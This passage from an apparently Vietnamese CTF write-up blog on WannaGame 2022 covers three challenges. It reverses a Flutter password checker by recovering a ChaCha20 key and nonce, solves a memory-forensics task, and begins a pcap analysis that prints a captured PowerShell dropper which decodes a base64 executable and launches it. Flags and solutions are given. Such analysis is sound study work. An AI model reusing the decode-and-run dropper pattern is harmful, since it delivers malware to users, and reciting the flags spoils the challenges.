build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> MaterialApp(</span><br><span class="line">      title: <span class="string">&#x27;Flutter APP&#x27;</span>,</span><br><span class="line">      theme: ThemeData(</span><br><span class="line">        <span class="comment">// This is the theme of your application.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Try running your application with &quot;flutter run&quot;. You&#x27;ll see the</span></span><br><span class="line">        <span class="comment">// application has a blue toolbar. Then, without quitting the app, try</span></span><br><span class="line">        <span class="comment">// changing the primarySwatch below to Colors.green and then invoke</span></span><br><span class="line">        <span class="comment">// &quot;hot reload&quot; (press &quot;r&quot; in the console where you ran &quot;flutter run&quot;,</span></span><br><span class="line">        <span class="comment">// or simply save your changes to &quot;hot reload&quot; in a Flutter IDE).</span></span><br><span class="line">        <span class="comment">// Notice that the counter didn&#x27;t reset back to zero; the application</span></span><br><span class="line">        <span class="comment">// is not restarted.</span></span><br><span class="line">        primarySwatch: Colors.blue,</span><br><span class="line">      ),</span><br><span class="line">      home: <span class="keyword">const</span> MyHomePage(title: <span class="string">&#x27;WannaGame Championship Challenge&#x27;</span>),</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MyHomePage(&#123;Key? key, <span class="keyword">required</span> <span class="keyword">this</span>.title&#125;) : <span class="keyword">super</span>(key: key);</span><br><span class="line">  <span class="comment">// This widget is the home page of your application. It is stateful, meaning</span></span><br><span class="line">  <span class="comment">// that it has a State object (defined below) that contains fields that affect</span></span><br><span class="line">  <span class="comment">// how it looks.</span></span><br><span class="line">  <span class="comment">// This class is the configuration for the state. It holds the values (in this</span></span><br><span class="line">  <span class="comment">// case the title) provided by the parent (in this case the App widget) and</span></span><br><span class="line">  <span class="comment">// used by the build method of the State. Fields in a Widget subclass are</span></span><br><span class="line">  <span class="comment">// always marked &quot;final&quot;.</span></span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">String</span> title;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  State&lt;MyHomePage&gt; createState() =&gt; _MyHomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Future&lt;<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt;&gt; bytes(<span class="built_in">String</span> password) <span class="keyword">async</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">bool</span> ok = <span class="keyword">await</span> ch(password);</span><br><span class="line">  <span class="keyword">if</span>(ok)</span><br><span class="line">    <span class="keyword">return</span> password.codeUnits;</span><br><span class="line">  <span class="keyword">return</span> password.codeUnits;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_MyHomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">MyHomePage</span>&gt; </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="comment">// This method is rerun every time setState is called, for instance as done</span></span><br><span class="line">    <span class="comment">// by the _incrementCounter method above.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The Flutter framework has been optimized to make rerunning build methods</span></span><br><span class="line">    <span class="comment">// fast, so that you can just rebuild anything that needs updating rather</span></span><br><span class="line">    <span class="comment">// than having to individually change instances of widgets.</span></span><br><span class="line">    <span class="keyword">return</span> Scaffold(</span><br><span class="line">      appBar: AppBar(</span><br><span class="line">        <span class="comment">// Here we take the value from the MyHomePage object that was created by</span></span><br><span class="line">        <span class="comment">// the App.build method, and use it to set our appbar title.</span></span><br><span class="line">        title: Text(widget.title),</span><br><span class="line">      ),</span><br><span class="line">      body: Input_Text(),</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Future&lt;<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt;&gt; calc_sha256(<span class="built_in">String</span> password) <span class="keyword">async</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> algorithm_hash = Sha256();</span><br><span class="line">  <span class="keyword">final</span> sink = algorithm_hash.newHashSink();</span><br><span class="line">  <span class="comment">// sink.add(password.codeUnits);</span></span><br><span class="line">  sink.add(<span class="keyword">await</span> bytes(password));</span><br><span class="line">  sink.close();</span><br><span class="line">  <span class="keyword">final</span> hash = <span class="keyword">await</span> sink.hash();</span><br><span class="line">  <span class="keyword">return</span> hash.bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Input_Text</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">  Input_Text(&#123;Key? key&#125;) : <span class="keyword">super</span>(key: key);</span><br><span class="line">  TextEditingController password_ctl = TextEditingController();</span><br><span class="line">  TextEditingController flag_check_ctl = TextEditingController();</span><br><span class="line">  TextEditingController flag = TextEditingController();</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> Column(</span><br><span class="line">      crossAxisAlignment: CrossAxisAlignment.start,</span><br><span class="line">      children: &lt;Widget&gt;[</span><br><span class="line">        Padding(</span><br><span class="line">          padding: EdgeInsets.symmetric(horizontal: <span class="number">8</span>, vertical: <span class="number">16</span>),</span><br><span class="line">          child: TextField(</span><br><span class="line">            controller: password_ctl,</span><br><span class="line">            decoration: InputDecoration(</span><br><span class="line">              border: OutlineInputBorder(),</span><br><span class="line">              hintText: <span class="string">&#x27;Enter a password&#x27;</span>,</span><br><span class="line">            ),</span><br><span class="line">          ),</span><br><span class="line">        ),</span><br><span class="line">        Container(</span><br><span class="line">            alignment: Alignment.center,</span><br><span class="line">            height: <span class="number">50</span>,</span><br><span class="line">            padding: <span class="keyword">const</span> EdgeInsets.fromLTRB(<span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>),</span><br><span class="line">            child: ElevatedButton(</span><br><span class="line">                child: <span class="keyword">const</span> Text(<span class="string">&#x27;Check password&#x27;</span>),</span><br><span class="line">                onPressed: () <span class="keyword">async</span> &#123;</span><br><span class="line">                  <span class="keyword">var</span> hash_pass = &lt;<span class="built_in">int</span>&gt;[<span class="number">127</span>, <span class="number">16</span>, <span class="number">136</span>, <span class="number">53</span>, <span class="number">147</span>, <span class="number">106</span>, <span class="number">226</span>, <span class="number">166</span>, <span class="number">95</span>, <span class="number">199</span>, <span class="number">25</span>, <span class="number">214</span>, <span class="number">163</span>, <span class="number">157</span>, <span class="number">159</span>, <span class="number">72</span>, <span class="number">58</span>, <span class="number">95</span>, <span class="number">116</span>, <span class="number">239</span>, <span class="number">177</span>, <span class="number">224</span>, <span class="number">103</span>, <span class="number">132</span>, <span class="number">201</span>, <span class="number">73</span>, <span class="number">232</span>, <span class="number">210</span>, <span class="number">83</span>, <span class="number">152</span>, <span class="number">54</span>, <span class="number">109</span>];</span><br><span class="line">                  <span class="keyword">final</span> hash = <span class="keyword">await</span> calc_sha256(password_ctl.text);</span><br><span class="line">                  <span class="built_in">bool</span> check = cta(hash_pass,hash);</span><br><span class="line">                  <span class="keyword">if</span>(check)</span><br><span class="line">                  &#123;</span><br><span class="line">                    flag_check_ctl.text=<span class="string">&quot;Correct&quot;</span>;</span><br><span class="line">                    flag.text=<span class="string">&quot;Try to submit it !!!&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    flag_check_ctl.text = <span class="string">&quot;Wrong!!! Try again ^.^&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">            Image.asset(</span><br><span class="line">            <span class="string">&quot;graphics/meowmeow.gif&quot;</span>,</span><br><span class="line">              ),</span><br><span class="line">        TextField(</span><br><span class="line">            decoration: InputDecoration(</span><br><span class="line">                border: InputBorder.none,</span><br><span class="line">                enabled: <span class="keyword">false</span></span><br><span class="line">            ),</span><br><span class="line">            controller: flag_check_ctl,</span><br><span class="line">            textAlign: TextAlign.center,</span><br><span class="line">            style: TextStyle(color: Colors.red)</span><br><span class="line">        ),</span><br><span class="line">        TextField(</span><br><span class="line">          decoration: InputDecoration(</span><br><span class="line">              border: InputBorder.none,</span><br><span class="line">              enabled:<span class="keyword">false</span></span><br><span class="line">          ),</span><br><span class="line">          controller: flag,</span><br><span class="line">          textAlign: TextAlign.center,</span><br><span class="line">          style: TextStyle(color: Colors.blue,fontStyle: FontStyle.italic),</span><br><span class="line">        )</span><br><span class="line">      ],</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ở class cuối, có lời nhắn về việc flag đúng sai khi click vào button -&gt; Ta sẽ bắt đầu ở hàm này. <code>Source</code> sẽ là input từ người dùng và <code>Sink</code> chính là hệ thống hiện thị flag đúng.</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">onPressed: () <span class="keyword">async</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> hash_pass = &lt;<span class="built_in">int</span>&gt;[<span class="number">127</span>, <span class="number">16</span>, <span class="number">136</span>, <span class="number">53</span>, <span class="number">147</span>, <span class="number">106</span>, <span class="number">226</span>, <span class="number">166</span>, <span class="number">95</span>, <span class="number">199</span>, <span class="number">25</span>, <span class="number">214</span>, <span class="number">163</span>, <span class="number">157</span>, <span class="number">159</span>, <span class="number">72</span>, <span class="number">58</span>, <span class="number">95</span>, <span class="number">116</span>, <span class="number">239</span>, <span class="number">177</span>, <span class="number">224</span>, <span class="number">103</span>, <span class="number">132</span>, <span class="number">201</span>, <span class="number">73</span>, <span class="number">232</span>, <span class="number">210</span>, <span class="number">83</span>, <span class="number">152</span>, <span class="number">54</span>, <span class="number">109</span>];</span><br><span class="line">    <span class="keyword">final</span> hash = <span class="keyword">await</span> calc_sha256(password_ctl.text);</span><br><span class="line">    <span class="built_in">bool</span> check = cta(hash_pass,hash);</span><br><span class="line">    <span class="keyword">if</span>(check)</span><br><span class="line">    &#123;</span><br><span class="line">        flag_check_ctl.text=<span class="string">&quot;Correct&quot;</span>;</span><br><span class="line">        flag.text=<span class="string">&quot;Try to submit it !!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        flag_check_ctl.text = <span class="string">&quot;Wrong!!! Try again ^.^&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>Ta có Call graph như sau:<br><img src="/images/wannagame-2022_x.png"></p>
<p>Có 2 hàm cần chú ý là <code>cts</code> và <code>cta</code>:</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> cts(<span class="built_in">String</span> str1,<span class="built_in">String</span> str2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> str1==str2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">bool</span> cta(<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr1,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt;arr2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>;i&lt;arr1.length;i++)</span><br><span class="line">    <span class="keyword">if</span>(arr1[i]!=arr2[i])</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Về cơ bản thì 2 hàm này đều để compare giữa 2 object với nhau -&gt; Đặt vấn đề <code>sink</code> sẽ nằm ở đây (mục tiêu tạo giá trị &#x3D; <code>True</code>)</p>
<p>Ở hàm <code>calc_sha256</code>, ngoại trừ việc gọi tới hàm <code>bytes</code> đáng ngờ ra thì phần còn lại để tính hash sha256 như bình thường, suy ra mục tiêu cần đạt được là tìm input sao cho: <code>hash_pass == SHA256(input)</code>. </p>
<p>Tuy nhiên với lượng thông tin như vậy là chưa đủ (hash không nằm trong database có sẵn trên web để crack), nên cần tập trung chính vào hàm <code>calc_chacha20</code>. Hàm <code>cts</code> so sánh giữa input và giá trị trả về của <code>calc_chacha20</code>, cho nên đây có thể là hàm giải mã 1 chuỗi đã được mã hoá trong chương trình.</p>
<p>Đến đây, có 2 cách có thể thực hiện:</p>
<ul>
<li>Dynamic: chạy chương trình và hook vào hàm cts để lấy thông tin 2 chuỗi được so sánh</li>
<li>Static: Reproduce lại kết quả của hàm calc_chacha20</li>
</ul>
<p>Ở đây thì mình cũng chưa rành phương pháp dynamic lắm, nên tạm thời sẽ theo hướng static là chính :&gt;</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Future&lt;<span class="built_in">bool</span>&gt; ch(<span class="built_in">String</span> p) <span class="keyword">async</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">String</span> dp = <span class="keyword">await</span> calc_chacha20(m(),k(),n(),ma());</span><br><span class="line">  <span class="keyword">if</span> (cts(dp,p))</span><br><span class="line">    <span class="keyword">return</span> Future.value(<span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">return</span> Future.value(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; m() </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> message = &lt;<span class="built_in">int</span>&gt;[<span class="number">13</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">95</span>, <span class="number">82</span>, <span class="number">154</span>, <span class="number">188</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">210</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">56</span>, <span class="number">108</span>, <span class="number">22</span>, <span class="number">100</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;message.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      message[i]=message[i]^<span class="number">0xab</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; k()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ra();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; n()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> rb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span> &lt;<span class="built_in">int</span>&gt; ma()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> mac = &lt;<span class="built_in">int</span>&gt;[<span class="number">162</span>, <span class="number">93</span>, <span class="number">181</span>, <span class="number">147</span>, <span class="number">1</span>, <span class="number">86</span>, <span class="number">102</span>, <span class="number">148</span>, <span class="number">137</span>, <span class="number">92</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">192</span>, <span class="number">189</span>, <span class="number">204</span>, <span class="number">190</span>, <span class="number">40</span>, <span class="number">167</span>, <span class="number">4</span>, <span class="number">227</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">100</span>, <span class="number">53</span>];</span><br><span class="line">  <span class="keyword">return</span> mac;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; ra() </span><br><span class="line">&#123;</span><br><span class="line">  Random rand = Random(<span class="number">1412</span>);</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      arr.add(rand.nextInt(<span class="number">256</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; rb()</span><br><span class="line">&#123;</span><br><span class="line">  Random rand = Random(<span class="number">0xdeadbeef</span>);</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">    arr.add(rand.nextInt(<span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Future&lt;<span class="built_in">String</span>&gt; calc_chacha20(<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; m,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; k,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; n,<span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; ma) <span class="keyword">async</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> algorithm = Chacha20(</span><br><span class="line">    macAlgorithm: Hmac.sha256(),</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">final</span> secretKey = <span class="keyword">await</span> algorithm.newSecretKeyFromBytes(k);</span><br><span class="line">  SecretBox secretBox = SecretBox(m,nonce: n,mac:Mac(ma));</span><br><span class="line">  <span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; clearText = <span class="keyword">await</span> algorithm.decrypt(</span><br><span class="line">      secretBox,</span><br><span class="line">      secretKey: secretKey</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCodes(clearText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Chacha20 gồm 2 thành phần chính là key và nonce tạo thành stream (<a target="_blank" rel="noopener" href="https://loup-vaillant.fr/tutorials/chacha20-design">https://loup-vaillant.fr/tutorials/chacha20-design</a>). Sau đó việc encrypt&#x2F;decrypt chỉ đơn giản là việc xor stream với message&#x2F;ciphertext.</p>
<p>Theo <a target="_blank" rel="noopener" href="https://pub.dev/documentation/cryptography/latest/cryptography/Chacha20-class.html">https://pub.dev/documentation/cryptography/latest/cryptography/Chacha20-class.html</a>:</p>
<ul>
<li>secretKeyLength is 32 bytes</li>
<li>nonceLength is 12 bytes</li>
</ul>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span> dp = <span class="keyword">await</span> calc_chacha20(m(),k(),n(),ma());</span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; k()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ra();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">List</span>&lt;<span class="built_in">int</span>&gt; n()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> rb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Cộng với việc <code>ra</code>, <code>rb</code> lần lượt tạo ra mảng 32 và 12 bytes -&gt; đoán được đây là secret và nonce (có thể từ kiểm nghiệm lại từ flow của chương trình).</p>
<p>Ciphertext của chương trình nằm ở hàm <code>m</code> (giá trị trả về của hàm làm tham số để truyền vào <code>SecretBox</code>). Và phần này đơn giản chỉ là xor ngược lại mảng với 0xab để tìm ciphertext gốc:</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ....</span></span><br><span class="line">  <span class="keyword">final</span> message = &lt;<span class="built_in">int</span>&gt;[<span class="number">13</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">95</span>, <span class="number">82</span>, <span class="number">154</span>, <span class="number">188</span>, <span class="number">102</span>, <span class="number">63</span>, <span class="number">210</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">56</span>, <span class="number">108</span>, <span class="number">22</span>, <span class="number">100</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="built_in">int</span> i =<span class="number">0</span>;i&lt;message.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      message[i]=message[i]^<span class="number">0xab</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ....</span></span><br></pre></td></tr></table></figure>

<p>Vấn đề đặt ra ở <code>ra</code>, <code>rb</code>: làm sao để tìm lại mảng ? (cả 2 hàm đều sử dụng đến random). Để ý thấy được cả 2 đều dùng 1 giá trị cố định cho seed của Random -&gt; giá trị ở mỗi lần chạy có thể sẽ được giữ nguyên!.</p>
<p>Để cho tiện thì có thể sử dụng <a target="_blank" rel="noopener" href="https://dartpad.dev/">https://dartpad.dev/</a> để chạy chương trình và tìm giá trị trả về của 2 hàm như sau:</p>
<p><img src="/images/wannagame-2022_2022-12-17-00-55-06.png"></p>
<p>Từ 3 thành phần tìm được:</p>
<ul>
<li>ciphertext: a6ae07e32a47c1faf4f93117cd94793dfb93c7bdcf</li>
<li>secretkey: b0f64f17877bd72bc2c1adc614d42f818d077889729fd7edcddfb85967033104</li>
<li>nonce: 53b724922ef0da39bdcbb46a</li>
</ul>
<p>Sau đó, có thể sử dụng tool bất kỳ để có thể decrypt (Ở đây mình sẽ sử dụng CyberChef):</p>
<p><img src="/images/wannagame-2022_2022-12-17-00-57-21.png"></p>
<p><strong>Flag</strong>: <code>L0v3$W^na0n3_U1T_1412</code></p>
<h2 id="3-Memory"><a href="#3-Memory" class="headerlink" title="3. Memory"></a>3. Memory</h2><p><img src="/images/wannagame-2022_2022-12-17-21-27-23.png"></p>
<h3 id="Danh-sach-cac-file-2"><a href="#Danh-sach-cac-file-2" class="headerlink" title="Danh sách các file"></a>Danh sách các file</h3><ul>
<li>memory.raw (Do file nặng nên sẽ không upload ở đây :&gt;)</li>
</ul>
<h3 id="Too-Short-Didn’t-Read"><a href="#Too-Short-Didn’t-Read" class="headerlink" title="Too Short, Didn’t Read"></a>Too Short, Didn’t Read</h3><p>Từ đề bài đã gợi ý về chuyện “or not” <img src="/images/Popo/7.webp" width="32" height="32" style="display:inline">, cho nên là…</p>
<p><img src="/images/wannagame-2022_2022-12-17-21-30-26.png"></p>
<p><strong>Flag</strong>: <code>W1&#123;M3moRy_F0r3nsics_34sy_R1ght???&#125;</code></p>
<h2 id="4-Kittensware"><a href="#4-Kittensware" class="headerlink" title="4. Kittensware"></a>4. Kittensware</h2><p><img src="/images/wannagame-2022_2022-12-17-21-37-56.png"></p>
<h3 id="Danh-sach-cac-file-3"><a href="#Danh-sach-cac-file-3" class="headerlink" title="Danh sách các file:"></a>Danh sách các file:</h3><ul>
<li><a href="/data/wannagame-2022/kittensware/W1_Chall.pcapng">W1_Chall.pcapng</a></li>
</ul>
<h3 id="Tong-quan-2"><a href="#Tong-quan-2" class="headerlink" title="Tổng quan:"></a>Tổng quan:</h3><p>Về bài này thì team mình tự hào là team duy nhất giải ra (vào cuối giờ theo đúng nghĩa đen <img src="/images/Popo/1.webp" width="32" height="32" style="display:inline"> - 2 phút trước khi kết thúc). Đồng thời đây cũng là bài tốn thời gian nhất :)) ~30p mình ngồi kiếm cách để unpack <code>VMProtect</code> để rồi nhận ra không cần unpack vẫn xem code được <img src="/images/Popo/1.webp" width="32" height="32" style="display:inline">… + ~ 1 tiếng để tĩnh tâm hiểu được flow chương trình. Trong vòng 1 tiếng thì mình dùng <code>Rubber duck debugging</code> với đứa đồng đội kế bên và thấy khá hiệu quả :&gt; nên nếu có khó khăn gì thì cứ thử nhé <img src="/images/Popo/5.webp" width="32" height="32" style="display:inline">.</p>
<p>Lan man vậy đủ rôì :&gt; bắt đầu reverse thôi</p>
<h3 id="Suspected-binary-in-network-trafic"><a href="#Suspected-binary-in-network-trafic" class="headerlink" title="Suspected binary in network trafic"></a>Suspected binary in network trafic</h3><p>Khi mở file lên bằng <code>Wireshark</code>, đầu tiên sẽ thực hiện filter dựa trên <code>http</code> protocol để tìm ra những file được <code>download</code> và <code>upload</code> (Data ở dạng raw, có thể dump được do không bị mã hoá trên đường truyền ở cả 2 phía):</p>
<p><img src="/images/wannagame-2022_2022-12-17-22-00-33.png"></p>
<p>Dễ dàng thấy được có 1 file Powershell đáng ngờ đã được tải về (dựa theo đuôi <code>.ps</code>), còn lại là các request POST tới <code>/beacon_ring</code>.</p>
<p>Dump file Powershell được kq như sau:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b64</span>=<span class="string">&#x27;TVqQAA...&lt;chuỗi dài&gt;...lbgA=&#x27;</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;C:\Users\Public\challenge.exe&#x27;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$b64</span>)</span><br><span class="line">[<span class="type">IO.File</span>]::WriteAllBytes(<span class="variable">$filename</span>, <span class="variable">$bytes</span>)</span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&#x27;C:\Users\Public\challenge.exe&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Công việc chính của file Powershell này là từ chuỗi mã hoá base64, decode và lưu ra file <code>challenge.exe</code>, sau đó sẽ khởi chạy file này (1 kiểu hoạt động cơ bản của Trojan, hide -&gt; inject -&gt; eavesdrop :&gt;)</p>
<p>Để lấy được file <code>challenge.exe</code> thì cần decode base64 và lưu &#x3D; thành file binary (có thể dùng tool Cyberchef luôn) hoặc đơn giản hơn thì chỉ cần xoá dòng cuối <code>Start-Process...</code>, chạy file Powershell cho nó tự giải mã và vào <code>&#39;C:\Users\Public</code> để lấy file (Không khuyến khích chạy file nếu chưa biết nó sẽ làm gì)</p>
<p>Sau khi có được <code>challenge.exe</code>, thử analyze với <code>Detect It Easy</code> ta có được thông tin như sau:</p>
<p><img src="/images/wannagame-2022_2022-12-17-22-13-47.png"></p>
<p>Các thông tin tìm được:</p>
<ul>
<li>Được protect bằng <code>VMProtect</code> ở mức min (Phần này mọi người có thể tự tìm hiểu xem nó sẽ làm gì nhé)</li>
